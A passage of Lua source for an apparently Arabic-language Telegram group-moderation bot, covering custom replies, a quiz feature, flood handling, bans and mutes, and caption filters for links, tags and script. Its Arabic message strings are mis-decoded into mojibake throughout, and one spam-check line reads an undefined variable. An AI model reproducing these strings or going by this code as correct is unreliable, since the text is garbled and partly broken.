DevRio:del(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevRio:del(Rinda..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Rinda..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ โข 100 ูู ุงุณุฆูุฉ ุงููุช โข "..GetKtTexts ,  1, "md")
DevRio:del(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
return false
end
local Rio = "โ๏ธฐุชู ุญูุธ ุงูุฑุฏ ุฑูู โข "..(#List+1).."\nโ๏ธฐูู ุจุงุฑุณุงู ุงูุณุคุงู ุฑูู โข "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงููุงุก ูุญูุธ "..(#List+1).." ูู ุงูุงุณุฆูู โข",callback_data="/EndKt:"..msg.sender_user_id_..GetKtTexts}},{{text="โข ุงูุบุงุก ูุญุฐู ุงูุชุฎุฒูู โข",callback_data="/DelAllKt:"..msg.sender_user_id_..GetKtTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Rio).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevRio:get(Rinda..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Rinda..'Rio:Sudo:Kt'..msg.chat_id_,text) then
local RindaTeam =  DevRio:smembers(Rinda..'Rio:Text:KtTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..RindaTeam[math.random(#RindaTeam)]..']' , 1, 'md')  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'ุงูุบุงุก' then
local DelManagerRep = DevRio:get(Rinda..'DelManagerRep'..msg.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ', 1, 'md')
DevRio:del(Rinda..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(Rinda..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(Rinda..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(Rinda..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(Rinda..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(Rinda..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(Rinda..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(Rinda..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevRio:set(Rinda..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(Rinda..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(Rinda..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ุงูุฑุฏ ุงูุฌุฏูุฏ', 1, 'md') 
DevRio:del(Rinda..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Rinda..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevRio:get(Rinda..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(Rinda..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Rinda..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Rinda..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Rinda..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Rinda..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Rinda..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Rinda..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(Rinda..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function RindaTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ูุง ููุฌุฏ' end
local edit_msg = DevRio:get(Rinda..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Rinda..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'ูุง ููุฌุฏ')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, RindaTeam)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'ุงูุบุงุก' then
local DelSudoRep = DevRio:get(Rinda..'DelSudoRep')
DevRio:del(Rinda.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ', 1, 'md')
DevRio:del(Rinda.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Rinda.."DelSudoRep")
return false
end
DevRio:del(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(Rinda.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(Rinda.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(Rinda.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(Rinda.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(Rinda.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(Rinda.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevRio:set(Rinda.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevRio:set(Rinda.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevRio:set(Rinda.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ุงูุฑุฏ ุงูุฌุฏูุฏ', 1, 'md') 
DevRio:del(Rinda.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Rinda..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(Rinda..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(Rinda.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(Rinda.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Rinda.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Rinda.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(Rinda.."Rio:Text:AllRed"..msg.content_.text_) then
function RindaTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ูุง ููุฌุฏ' end
local edit_msg = DevRio:get(Rinda..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Rinda.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'ูุง ููุฌุฏ')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, RindaTeam)
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธฐุงูุนุถู โข '..GetName..' \nโ๏ธฐูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ุทุฑุฏู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevRio:sismember(Rinda..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธฐุงูุนุถู โข '..GetName..' \nโ๏ธฐูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ุชููุฏู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(Rinda..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธฐุงูุนุถู โข '..GetName..' \nโ๏ธฐูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ูุชูู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions Rinda --
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Rinda then
floods = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(Rinda.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevRio:setex(Rinda.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Rinda) then
DevRio:set(Rinda..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(Rinda..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(Rinda..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(Rinda..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(Rinda..'Rio:viewget'..msg.sender_user_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฏุฏ ูุดุงูุฏุงุช ุงูููุดูุฑ ูู โข ('..msg.views_..')', 1, 'md')
DevRio:del(Rinda..'Rio:viewget'..msg.sender_user_id_)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevRio:get(Rinda..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Rinda..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevRio:get(Rinda..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Sticker         --
if not VipMem(msg) then
if DevRio:get(Rinda..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevRio:get(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = 'โข ููุฑุช ุญุจู \nโข firstname \nโข @username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@Source_Rinda]'))
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevRio:get(Rinda.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(Rinda..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Rinda,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Rinda) then 
if DevRio:sismember(Rinda..'Rio:Groups',msg.chat_id_) then BotText = "ููุนูู ูู ุงูุณุงุจู\nโ๏ธฐุงุฑุณู โข ุงูุงูุงูุฑ ูุงุณุชูุชุน ุจุงููููุฒูุงุช" else BotText = "ูุนุทูู ูุฌุจ ุฑูุนู ูุดุฑู\nโ๏ธฐุจุนุฏ ุฐูู ูุฑุฌู ุงุฑุณุงู ุงูุฑ โข ุชูุนูู\nโ๏ธฐุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง" end 
if DevRio:get(Rinda.."Rio:Text:BotWelcome") then RioText = DevRio:get(Rinda.."Rio:Text:BotWelcome") else RioText = "โ๏ธฐูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธฐุญุงูุฉ ุงููุฌููุนู โข "..BotText.."\n-----------------------------------------" end 
if DevRio:get(Rinda.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(Rinda.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
if RioPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,RioPhoto,RioText)
else 
